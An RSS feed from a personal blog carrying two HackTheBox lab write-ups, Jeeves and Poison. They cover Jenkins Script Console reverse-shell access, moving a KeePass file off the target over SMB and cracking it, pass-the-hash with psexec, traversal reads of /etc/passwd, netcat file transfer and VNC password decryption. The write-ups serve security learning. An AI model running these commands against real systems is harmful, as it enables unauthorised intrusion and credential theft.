<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>HTB on Ep1cac</title>
    <link>http://localhost:1313/tags/htb/</link>
    <description>Recent content in HTB on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Mon, 11 Nov 2024 12:54:22 -0600</lastBuildDate><atom:link href="http://localhost:1313/tags/htb/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>Jeeves</title>
      <link>http://localhost:1313/posts/jeeves/</link>
      <pubDate>Mon, 11 Nov 2024 12:54:22 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/jeeves/</guid>
      <description><![CDATA[<p><img src="/img/jeeves/jeeves.png#center" alt="Jeeves"></p>
<h3 id="description">Description</h3>
<p>Jeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator&rsquo;s NTLM hash.</p>
<h3 id="recon">Recon</h3>
<p>Starting off with a nmap scan:</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Mon Nov 11 13:02:01 2024 as: nmap -p- -A -v -T4 -oN /tmp/nmap.scan 10.10.10.63
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.63
Host is up (0.043s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Mon Nov 11 12:55:57 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-12T00:05:55
|_  start_date: 2024-11-11T23:57:06
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.96 ms 10.10.14.1
2   45.71 ms 10.10.10.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 11 13:05:35 2024 -- 1 IP address (1 host up) scanned in 214.46 seconds
</code></pre><p>I found several services, including SMB, RPC, and two HTTP servers on ports 80 and 50000. Enumerating the web server on port 80 and SMB do not reveal anything interesting. I was able to use RPC to find some endpoints, but I did not see anyway I could exploit Jeeves with the information.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ impacket-rpcdump -p 135 10.10.10.63
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.10.10.63
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.63[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]
          ncalrpc:[WMsgKRpc097A31]

Protocol: N/A 
Provider: N/A 
UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0 
Bindings: 
          ncalrpc:[LRPC-f01d6a34deb1026cb0]
          ncalrpc:[dabrpc]
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-f24b240fdec2bc8c52]
          ncalrpc:[LRPC-bb6163cae863dbd5f9]
          ncalrpc:[LRPC-82dd959ab6b7e8366d]
          ncacn_np:\\JEEVES[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-300bf2e2daeee2de9a]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

...
</code></pre><p>However, I did find an interesting directory on the port 50000 website.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -C 404 -n
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &#34;epi&#34; Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves =&gt; http://10.10.10.63:50000/askjeeves/
[####################] - 2m    119601/119601  0s      found:1       errors:0      
[####################] - 2m    119601/119601  1048/s  http://10.10.10.63:50000/
</code></pre><p>We find a Jenkins dashboard.</p>
<p><img src="/img/jeeves/jenkins_web.png" alt="Jenkins Server"></p>
<p>Jenkins is an open source CI/CD server. In this case, anonymous users have full access to the dashboard. This happens when the Jenkins authorization strategy is set to Unsecured. After compromising the machine, I confirmed this was the case by checking <code>config.xml</code> and finding the unsecured authorization strategy in use.</p>
<p><code>&lt;authorizationStrategy class=&quot;hudson.security.AuthorizationStrategy$Unsecured&quot;/&gt;</code></p>
<h3 id="foothold">Foothold</h3>
<p>We can leverage our permissions to access the Script Console by going to &ldquo;Mange Jenkins&rdquo; &gt; &ldquo;Script Console&rdquo;.</p>
<p><img src="/img/jeeves/script_console.png" alt="Jenkins Script Console"></p>
<p>Here we can execute a Groovy code to get a reverse shell. I got mine from revshells, but it is worth noting that Java shells also work because Groovy is a superset of Java and also runs on the JVM.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.63] 49681
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins&gt;
</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
<p>I always go for low-hanging fruit first when escalating privileges. Looking at my user privilege, I saw that we have the SEImpersonatePrivilege. We can potentially impersonate a high-privileged user.</p>
<pre tabindex="0"><code>C:\Temp&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
</code></pre><p>Unfortunately, this turns out to be a false lead. We&rsquo;ll have to look for other privesc vectors.</p>
<pre tabindex="0"><code>C:\Temp&gt;.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
[*] CombaseModule: 0x140717164658688
[*] DispatchTable: 0x140717166622152
[*] UseProtseqFunction: 0x140717166124880
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0f34-ffff-9033-ef4aa84d1797
[*] DCOM obj OXID: 0xb7f5e435d7866f08
[*] DCOM obj OID: 0x59d6cba54f6519d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
</code></pre><p>Eventually, I come across a KeePass database file.</p>
<pre tabindex="0"><code>C:\&gt;dir /s /b *.kdbx
dir /s /b *.kdbx
C:\Users\kohsuke\Documents\CEH.kdbx
</code></pre><p>KeePass files are password-protected and I don&rsquo;t have the utilities to crack the password on Jeeves, so I set up a SMB share to exfiltrate the file to my attacker machine.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-smbserver transfer /tmp/transfer -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Now to mount the share and transfer CEH.kdbx.</p>
<pre tabindex="0"><code>C:\Users\kohsuke\Documents&gt;net use M: \\10.10.14.31\transfer
net use M: \\10.10.14.31\transfer
The command completed successfully.


C:\Users\kohsuke\Documents&gt;copy CEH.kdbx M:
copy CEH.kdbx M:
        1 file(s) copied.
</code></pre><p>Next we can extract the KeePass password hash and crack it.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/transfer]
└─$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/transfer]
└─$ hashcat -a 0 &#39;$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48&#39; /usr/share/wordlists/rockyou.txt -m 13400
</code></pre><p>We get the password <code>moonshine1</code>. We can now view the contents of CEH.kdbx.</p>
<pre tabindex="0"><code>kpcli:/&gt; ls
=== Groups ===
CEH/
kpcli:/&gt; cd CEH
kpcli:/CEH&gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/CEH&gt; 
</code></pre><p>Inside the CEH group, we find some entries and more groups. Further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; ls *
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

/CEH/eMail:

/CEH/General:

/CEH/Homebanking:

/CEH/Internet:

/CEH/Network:

/CEH/Windows:
</code></pre><p>There are usernames and password hashes in the entries. I created a user wordlist as well as a password wordlist and sprayed them against Jeeves. In retrospect, this was not necessary since most of these users do not exist on the machine, so I could&rsquo;ve narrowed down my users to <code>Administrator</code>.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH&gt; show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH&gt; show -f 4

Title: It&#39;s a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH&gt; show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don&#39;t even need creds! Unhackable! 

kpcli:/CEH&gt; show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
</code></pre><p>None of the passwords worked, so I tried a pass-the-hash attack using the hash in entry 0 and gained access to the Administrator account.</p>
<p><img src="/img/jeeves/pwned.png" alt="Pass-the-hash"></p>
<p>And with that, Jeeves is owned.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-psexec Administrator@10.10.10.63 -hashes &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39;
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file EXTSwcYV.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service ShHJ on 10.10.10.63.....
[*] Starting service ShHJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; 
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Poison</title>
      <link>http://localhost:1313/posts/poison/</link>
      <pubDate>Mon, 16 Sep 2024 20:59:17 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/poison/</guid>
      <description><![CDATA[<p><img src="/img/poison/poison.png#center" alt="Poison"></p>
<h3 id="description">Description</h3>
<p>Poison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.</p>
<h3 id="recon">Recon</h3>
<p>We start by running a Nmap scan against the target.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -A 10.10.10.84 -T5   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 01:19 GMT
Warning: 10.10.10.84 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.84
Host is up (0.041s latency).
Not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.2-RELEASE - 11.3 RELEASE or 11.2-STABLE (96%), FreeBSD 11.3-RELEASE (96%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.1-RELEASE or 11.2-STABLE (95%), FreeBSD 11.1-RELEASE (95%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 12.0-RELEASE - 13.0-CURRENT (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   40.51 ms 10.10.14.1
2   40.65 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.47 seconds
</code></pre><p>The scan shows that TCP ports 22 and 80 are open. Visiting the webpage on port 80, we can see a website with the title &ldquo;Temporary website to test local .php scripts&rdquo;.</p>
<p><img src="/img/poison/website.png" alt="website"></p>
<p>There is a list of files that we can test. I tried listfiles.php. The output was messy, so I used view source to get a cleaner view.</p>
<p><img src="/img/poison/listfiles.png" alt="listfiles.php result"></p>
<p>We get a directory listing. It appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can&rsquo;t get a shell through RFI :(. We could also try other attack vectors like log poisoning (which does give you shell as <code>www-data</code>), but there is an interesting file &ldquo;pwdbackup.txt&rdquo; that we can check out first.</p>
<p><img src="/img/poison/encodedpass.png" alt="pwdbackup text"></p>
<p>Success! Now all we need to do is decode the password. We will need to do this 13 times, as implied by the note from out unsuspecting target. This can be done by passing the password to <code>base64 -d</code> manually, but it&rsquo;s far simpler to use a script. I&rsquo;ve provided one below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>encoded_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..13<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        encoded_pass<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span> | base64 -d<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>After running the script, we get our password <code>Charix!2#4%6&amp;8(0</code>.</p>
<h3 id="foothold">Foothold</h3>
<p>We have a password, but we don&rsquo;t know any users we could potentially authenticate as. Recall that the webpage can read files. Since we know that the target machine is likely FreeBSD, a Unix-like OS, we can try to read the <code>/etc/passwd</code> to find users.</p>
<p><img src="/img/poison/traversal_passwd.png" alt="/etc/passwd file"></p>
<p>Notice there are three users: <code>root</code>, <code>toor</code>, and <code>charix</code> that seem interesting. We can spray our password against these accounts via ssh. It is true that <code>Charix!2#4%6&amp;8(0</code> is likely the password for <code>charix</code>, it&rsquo;s still worth checking the other accounts for password reuse.</p>
<p><img src="/img/poison/pass_spray.png" alt="Password spray"></p>
<p>And now we can authenticate as <code>charix</code> to the server.</p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Now that we have a shell, we can move onto privilege escalation. Feel free to grab the user flag, but there is also a <code>secret.zip</code> file that might be interesting. It&rsquo;s password protected though, and I find files easier to investigate when they are on my local machine. So I transferred the zip file to Kali.</p>
<p>On Kali:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 8000 &gt; secret.zip            
listening on [any] 8000 ...
</code></pre><p>On Poison:</p>
<pre tabindex="0"><code>charix@Poison:~ % nc -nv 10.10.14.33 8000 &lt; secret.zip
Connection to 10.10.14.33 8000 port [tcp/*] succeeded!
</code></pre><p>Before trying to crack the password, we can test for password reuse by supplying the password we got for <code>charix</code> . It succeeds and we get a <code>secret</code> file that appears to be random binary data. I couldn&rsquo;t figure out its purpose at this point, so I decided to enumerate further. I noticed three TCP ports only accessible from localhost on Poison: 25, 5801, and 5901.</p>
<pre tabindex="0"><code>charix@Poison:~ % sockstat -4
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      728   4  tcp4   *:80                  *:*
charix   sshd       719   3  tcp4   10.10.10.84:22        10.10.14.33:57270
root     sshd       716   3  tcp4   10.10.10.84:22        10.10.14.33:57270
www      httpd      704   4  tcp4   *:80                  *:*
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
www      httpd      641   4  tcp4   *:80                  *:*
www      httpd      640   4  tcp4   *:80                  *:*
www      httpd      639   4  tcp4   *:80                  *:*
www      httpd      638   4  tcp4   *:80                  *:*
www      httpd      637   4  tcp4   *:80                  *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
</code></pre><p>I had already checked for any mail-related privesc vectors at this point, so I was more interested in ports 5801 and 5901. However, since they were only accessible by localhost on Poison, I had to forward them to my attacker machine.</p>
<pre tabindex="0"><code># Forward Port 5801
ssh -N -L 5801:127.0.0.1:5801 charix@10.10.10.84

# Forward Port 5901
ssh -N -L 5901:127.0.0.1:5901 charix@10.10.10.84
</code></pre><p>Now we can do some more enumeration.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p5801,5901 127.0.0.1 -sV --script=default
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 19:27 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000097s latency).

PORT     STATE SERVICE VERSION
5801/tcp open  http    Bacula http config
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.83 seconds
</code></pre><p>VNC is running on port 5901. VNC is a system designed to share screens. This means that a user using VNC can interact with&hellip; The VNC password file is usually stored in <code>~/.vnc/passwd</code>. This path does not exist for <code>charix</code> though, but there was a <code>passwd</code> file that we extracted from <code>secret.zip</code>. We can check if it it indeed a VNC password file by attempting to extract a VNC password:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
VNCP@$$!
</code></pre><p>Success! Now that we are certain we have a VNC password file, we can use it to connect to Poison.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ vncviewer -passwd secret 127.0.0.1::5901
</code></pre><p><img src="/img/poison/vnc_pwn.png" alt="vnc successful connect"></p>
<p>And with that, we have root on the machine.</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
